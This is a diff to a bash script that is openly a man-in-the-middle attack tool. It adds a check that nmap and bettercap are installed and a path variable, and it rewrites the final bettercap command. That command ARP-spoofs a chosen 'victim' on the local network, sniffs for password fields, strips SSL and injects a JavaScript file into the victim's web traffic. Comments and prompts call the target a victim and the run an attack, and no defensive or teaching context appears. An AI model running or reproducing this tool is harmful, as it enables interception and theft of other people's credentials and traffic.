@@ -1,5 +1,16 @@
 #!/usr/bin/env bash
 
+for cmd in "nmap ip bettercap grep cut xargs"; do
+  type $cmd 2>&1 >/dev/null
+
+  if [ $? -ne 0 ]; then 
+    echo "Please install $cmd for your system."
+    exit 1
+  fi
+done
+
+DIR=${DIR:-$(dirname $0)}
+
 # States
 readonly SCAN_ROUTER=0    # finding the router
 readonly SCAN_TARGETS=1   # finding the target victim
@@ -93,5 +104,5 @@ echo -en "\nPress enter to start attack on $target "
 
 read
 
-sudo bettercap -iface eth0 -eval "set net.sniff.local true; set net.sniff.regexp '.*password=.+'; set net.sniff.verbose true; net.sniff on; net.probe on; set arp.spoof.internal true; set arp.spoof.targets $target; arp.spoof on; set http.proxy.injectjs ${PWD}/index.js; set http.proxy.sslstrip true; http.proxy on"
+bettercap -iface eth0 -eval "set net.sniff.local true; set net.sniff.regexp '.*password=.+'; set net.sniff.verbose true; net.sniff on; net.probe on; set arp.spoof.internal true; set arp.spoof.targets $target; arp.spoof on; set http.proxy.injectjs ${DIR}/index.js; set http.proxy.sslstrip true; http.proxy on"
 
